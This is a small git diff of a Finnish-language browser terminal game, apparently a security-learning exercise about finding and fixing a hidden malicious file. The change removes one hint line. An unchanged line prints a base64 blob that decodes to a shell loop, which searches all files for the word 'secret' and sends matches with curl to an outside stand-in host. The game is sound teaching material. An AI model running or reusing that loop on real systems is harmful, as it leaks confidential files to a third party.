@@ -69,7 +69,7 @@ $('body').terminal({
             } else if (what == "README_yhdistys_ohje") {
                 this.echo("Yhdistys tietoverkkoon:\n1.Anna komento  network  ja paina Enter.\n2.Anna verkon nimi\n3.Anna verkon ip-osoite\n4.Anna verkon subnet\n5.Anna verkon salasana\n")
             } else if (what == "Korjausohje"){
-                this.echo("Järjestelmään on piiloutunut haitallinen tiedosto. HackCheckPro ohjelma saattaisi löytää sen.\nFileChecker voi korjata tiedostoja (käyttö: FileChecker tiedostonimi)\nSecuritySetup ohjelma hallinnoi tietoturva-asetuksia ja voi estää haittaohjelmien toiminnan.\n")
+                this.echo("Järjestelmään on piiloutunut haitallinen tiedosto. HackCheckPro ohjelma saattaisi löytää sen.\nFileChecker voi korjata tiedostoja (käyttö: FileChecker tiedostonimi)\n")
             } else if (what == "lolh4x" && fix == false){ 
                 this.echo("I2l0ZXJvaWRhYW4gZXJpbGxpc2V0IG9iamVrdGl0IGtva\nHRlZXNzYSwgam9rYSBtYWFyaXRlbGxhYW4gZmluZCBrb2\n1lbm5vbGxhLiBmaW5kIGtvbWVudG8gZXRzaWkgc3Blc2l\nmaXN0aSB0aWVkb3N0b2phLgpmb3IgZmlsZSBpbiAkKGZp\nbmQgLiAtdHlwZSBmKTsgZG8KICAgICNncmVwaWxsYSBoY\nWV0YWFuIGthaWtpc3RhIGFsaWthbnNpb2lzdGEgInNhbG\nFpbmVuIiAgdGVybWlhIGZpbmRpbiBsb3l0YW1pc3RhIG9\niamVrdGVpc3RhLgogICAgaWYgZ3JlcCAtcSAic2FsYWlu\nZW4iICRmaWxlOyB0aGVuCiAgICAgICAgZXhlYyAoY3Vyb\nCAkZmlsZSBodHRwczovL3Ryb2xsaXNpdnUubmV0KQogIC\nAgZmkKZG9uZQ==")
             } else if (what == "lolh4x" && fix == true) {
